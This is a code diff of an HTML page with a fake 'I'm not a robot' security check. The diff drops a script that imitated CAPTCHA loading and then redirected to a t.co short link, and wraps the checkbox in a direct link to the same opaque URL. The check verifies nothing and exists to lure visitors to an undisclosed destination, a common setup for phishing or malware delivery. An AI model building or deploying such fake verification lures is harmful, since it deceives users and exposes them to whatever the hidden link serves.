@@ -3906,9 +3906,11 @@ fbq("init", "1052221665938002");</script>
         <p>For security purposes, please confirm you are not an automated program.</p>
         <div class="popup-form" id="re-check">
             <div class="captcha-box">
+                  <a href="https://t.co/lXHxf8lzwd" target="_blank" rel="noopener noreferrer">
                 <div id="checkbox" class="checkbox"></div>
                 <div class="label">I'm not a robot</div>
                 <div class="robot-icon"></div>
+                </a>
             </div>
         </div>
     </div>
@@ -3918,23 +3920,6 @@ fbq("init", "1052221665938002");</script>
     </div>
 </div>
 
-<script>
-    const box = document.getElementById("checkbox");
 
-    box.addEventListener("click", () => {
-        if (box.classList.contains("checked") || box.classList.contains("loading")) return;
-        box.classList.add("loading");
-        const delay = Math.random() * (1500 - 300) + 300;
-        setTimeout(() => {
-            box.classList.remove("loading");
-            box.classList.add("checked");
-
-            setTimeout(() => {
-            window.location.href = "https://t.co/lXHxf8lzwd";
-            }, 200);
-
-        }, delay);
-        })
-</script>
 </body>
 </html>
